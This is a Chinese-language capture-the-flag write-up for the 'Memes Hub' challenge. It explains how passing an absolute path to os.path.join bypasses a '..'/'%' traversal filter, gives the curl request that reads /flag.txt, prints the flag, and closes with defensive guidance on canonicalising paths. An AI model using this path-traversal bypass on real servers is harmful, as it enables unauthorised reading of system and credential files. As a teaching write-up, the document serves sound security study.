# HackINI2024 Memes Hub

## 题目简述

应用通过 `/download?file=...` 下载 `/app/memes` 下的图片，并阻止包含 `..` 或 `%` 的参数。Dockerfile 却把 flag 复制为根目录 `/flag.txt`。目标是利用 `os.path.join()` 对绝对路径的处理，绕过看似严格的目录穿越过滤。

## 解题过程

核心逻辑为：

```python
file = request.args.get("file", "cry-until-you-get-the-flag.png")

if (".." not in file) and ("%" not in file):
    meme_path = os.path.join(app.root_path, "memes", file)
    if os.path.isfile(meme_path):
        return send_file(meme_path, as_attachment=True)
```

在 POSIX 路径语义下，只要后续组件是绝对路径，`os.path.join()` 就会丢弃此前的组件：

```python
os.path.join("/app", "memes", "/flag.txt") == "/flag.txt"
```

绝对路径 `/flag.txt` 不含 `..`，请求经过 URL 解码后也不含字面 `%`，所以通过过滤：

```bash
curl 'http://TARGET/download?file=/flag.txt'
```

服务器直接下载根目录文件，内容为：

```text
shellmates{J01N_4bS0lut3_pATh_F0R_LFI}
```

题目附带的四张 meme 只是页面装饰：哭脸图对应失败回退，其余三张是展示内容；它们不包含参数、代码或隐藏信息，因此无需在 WP 中保留图片副本。

## 方法总结

防路径穿越不能只检查 `..`。绝对路径、符号链接和不同平台分隔符都可能让最终路径逃离基目录。安全做法是解析候选路径，取得规范化绝对路径后验证其确实位于允许根目录之下，或只接受服务器端枚举出的文件标识。
